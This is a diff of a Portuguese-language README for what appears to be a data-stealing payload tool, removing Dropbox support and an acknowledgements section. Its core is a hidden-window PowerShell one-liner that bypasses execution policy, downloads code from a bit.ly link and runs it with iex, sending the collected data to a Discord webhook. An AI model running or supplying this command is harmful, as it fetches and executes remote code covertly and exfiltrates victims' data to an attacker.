@@ -43,7 +43,7 @@ Este programa foi desenvolvido para coletar o máximo de dados possível para fi
 
 ### Compatibilidade
 
-* Dropbox ou Discord
+* Discord
 * Windows 10,11
 
 <p align="right">(<a href="#top">voltar</a>)</p>
@@ -53,12 +53,8 @@ Este programa foi desenvolvido para coletar o máximo de dados possível para fi
 * Esperar alguns segundos e verificar o Discord
 
 `$dc` é a variável que guarda no webhook do discord 
-
-`$db` é a variável que guarda na dropbox 
-
-Um destes deve ser prenchido para os dados serem recolhidos
 ```
-powershell -w h -NoP -Ep Bypass $dc='';$db='';irm bit.ly/ClankPT | iex
+powershell -w h -NoP -Ep Bypass $dc='';irm bit.ly/ClankPT | iex
 ```
 
 <p align="right">(<a href="#top">voltar</a>)</p>
@@ -98,13 +94,5 @@ powershell -w h -NoP -Ep Bypass $dc='';$db='';irm bit.ly/ClankPT | iex
 </div>
 
 
-
-<p align="right">(<a href="#top">voltar</a>)</p>
-
-<!-- ACKNOWLEDGMENTS -->
-## Conhecimentos
-
-* [Hak5](https://hak5.org/)
-* [MG](https://github.com/OMG-MG)
 
 <p align="right">(<a href="#top">voltar</a>)</p>
